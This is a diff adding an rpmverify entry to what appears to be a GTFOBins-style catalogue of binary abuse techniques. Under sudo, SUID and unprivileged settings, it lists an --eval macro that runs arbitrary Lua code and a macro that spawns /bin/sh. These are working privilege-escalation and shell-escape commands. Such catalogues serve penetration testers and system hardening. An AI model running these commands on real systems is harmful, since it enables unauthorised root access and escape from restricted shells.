@@ -1,0 +1,29 @@
+rpmverify
+=========
+
+Inherit
+-------
+
+[Sudo]
+    rpmverify --eval '%{lua:...}'
+    This allows to run Lua code (`...`).
+
+[SUID]
+    rpmverify --eval '%{lua:...}'
+    This allows to run Lua code (`...`).
+
+[Unprivileged]
+    rpmverify --eval '%{lua:...}'
+    This allows to run Lua code (`...`).
+
+Shell
+-----
+
+[Sudo]
+    rpmverify --eval '%(/bin/sh 1>&2)'
+
+[SUID]
+    rpmverify --eval '%(/bin/sh 1>&2)'
+
+[Unprivileged]
+    rpmverify --eval '%(/bin/sh 1>&2)'
